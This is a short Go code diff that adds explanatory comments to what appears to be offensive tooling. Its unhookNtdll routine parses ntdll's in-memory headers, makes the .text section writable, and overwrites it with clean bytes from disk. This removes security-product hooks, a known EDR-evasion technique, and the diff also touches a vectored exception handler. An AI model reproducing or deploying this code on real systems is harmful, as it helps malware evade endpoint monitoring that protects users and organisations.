@@ -24,6 +24,7 @@ var (
 //
 //go:uintptrescapes
 func vehHandler(exceptionInfo uintptr) uintptr {
+	// Map EXCEPTION_POINTERS: first pointer = EXCEPTION_RECORD (contains exception code)
 	rec := (*struct {
 		code      uint32
 		flags     uint32
@@ -60,12 +61,14 @@ func unhookNtdll() string {
 	}
 
 	// Read DOS header
+	// Map in-memory ntdll base to IMAGE_DOS_HEADER for PE parsing
 	dosHeader := (*imageDOSHeader)(unsafe.Pointer(hMod))
 	if dosHeader.eMagic != 0x5A4D {
 		return "VEH Unhook: invalid DOS header"
 	}
 
 	// Read NT headers
+	// Map ntdll base + e_lfanew to IMAGE_NT_HEADERS64 for section enumeration
 	ntHeaders := (*imageNTHeaders64)(unsafe.Pointer(hMod + uintptr(dosHeader.eLfanew)))
 	if ntHeaders.signature != 0x00004550 {
 		return "VEH Unhook: invalid NT signature"
@@ -73,6 +76,7 @@ func unhookNtdll() string {
 
 	// Find .text section
 	var textSection *imageSectionHeader
+	// Map section headers array: follows optional header in NT headers layout
 	sectionHeaders := (*[1 << 10]imageSectionHeader)(unsafe.Pointer(
 		uintptr(unsafe.Pointer(&ntHeaders.optionalHeader)) + unsafe.Sizeof(ntHeaders.optionalHeader),
 	))
@@ -109,6 +113,7 @@ func unhookNtdll() string {
 		return "VEH Unhook: VirtualProtect failed"
 	}
 
+	// Byte-by-byte copy of clean .text from disk into hooked in-memory ntdll
 	for i := 0; i < len(origData); i++ {
 		*(*byte)(unsafe.Pointer(textAddr + uintptr(i))) = origData[i]
 	}
